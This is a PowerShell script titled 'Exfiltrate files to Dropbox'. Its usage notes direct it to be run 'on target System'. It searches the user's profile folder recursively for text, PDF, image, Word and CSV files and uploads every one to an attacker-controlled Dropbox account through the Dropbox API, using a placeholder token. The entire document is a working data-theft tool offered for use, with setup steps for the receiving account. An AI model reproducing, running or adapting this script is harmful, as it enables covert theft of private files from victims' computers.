<#
============================================= Exfiltrate files to Dropbox ========================================================

SYNOPSIS
This script searches for specific filetypes in the users folder and posts to a Dropbox account (developer app and token required).

SETTING UP DROPBOX
goto https://www.dropbox.com/developers/apps
click 'create app'
name it and select 'full dropbox' permission
open your newly created app and click 'Generate Token' in the 0auth section.
copy that token into your script.

USAGE
1. Input your credentials below
2. Run Script on target System
3. Check Dropbox for results

#> 
#=========================================================================================
$accessToken = "DROPBOX_ACCESS_TOKEN_HERE"
$localFolderPath = "$env:USERPROFILE\"
#=========================================================================================

$computerName = "$env:COMPUTERNAME"
$computerNameAsString = $computerName.ToString()
$dropboxCreateFolderUrl = "https://api.dropboxapi.com/2/files/create_folder_v2"
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}
$body = @{
    "path" = "/$computerName"
    "autorename" = $true
} | ConvertTo-Json

#=========================================================================================

$dropboxFolderPath = $computerName.ToString()
$dropboxUploadUrl = "https://content.dropboxapi.com/2/files/upload"

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/octet-stream"
}

$files = Get-ChildItem -Path $localFolderPath -Include "*.txt","*.pdf","*.jpg","*.png","*.docx","*.csv" -Recurse

foreach ($file in $files) {
    $relativePath = $file.FullName.Replace($localFolderPath, '').TrimStart('\')
    $dropboxFilePath = "$dropboxFolderPath/$relativePath".Replace('\', '/')

    $headers["Dropbox-API-Arg"] = "{`"path`": `"/$dropboxFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"

    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
    
        $response = Invoke-RestMethod -Uri $dropboxUploadUrl -Method Post -Headers $headers -Body $fileBytes
    
        Write-Host "Uploaded file: $($file.Name)"
    }
    catch {
        Write-Host "Error uploading file: $($file.Name) - $($_.Exception.Message)"
    }
}
